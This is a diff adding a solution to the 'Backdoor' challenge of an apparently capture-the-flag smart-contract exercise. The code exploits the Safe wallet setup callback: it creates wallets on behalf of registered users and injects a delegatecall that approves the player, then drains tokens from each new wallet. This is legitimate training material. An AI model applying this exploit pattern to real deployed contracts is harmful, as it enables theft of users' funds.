@@ -7,6 +7,10 @@ import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
 import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import {IProxyCreationCallback} from "safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";
+import {SafeProxy} from "safe-smart-account/contracts/proxies/SafeProxy.sol";
+import {Backdoor} from "../../src/backdoor/Backdoor.sol";
 
 contract BackdoorChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -71,6 +75,16 @@ contract BackdoorChallenge is Test {
      */
     function test_backdoor() public checkSolvedByPlayer {
         
+        Backdoor backdoorCtr = new Backdoor();
+
+        for (uint256 i = 0; i < users.length; i++) {
+            address[] memory _owners = new address[](1); 
+            _owners[0] = users[i];
+            bytes memory data = abi.encodeWithSelector(Backdoor.approve.selector, address(token), player);
+            bytes memory initializeData = abi.encodeWithSelector(Safe.setup.selector, _owners, 1, address(backdoorCtr), data, address(0), address(0), 0, address(0));
+            SafeProxy proxy = walletFactory.createProxyWithCallback(address(singletonCopy), initializeData, uint256(uint160(users[i])), IProxyCreationCallback(address(walletRegistry)));
+            IERC20(address(token)).transferFrom(address(proxy), recovery, 10e18);
+        }
     }
 
     /**
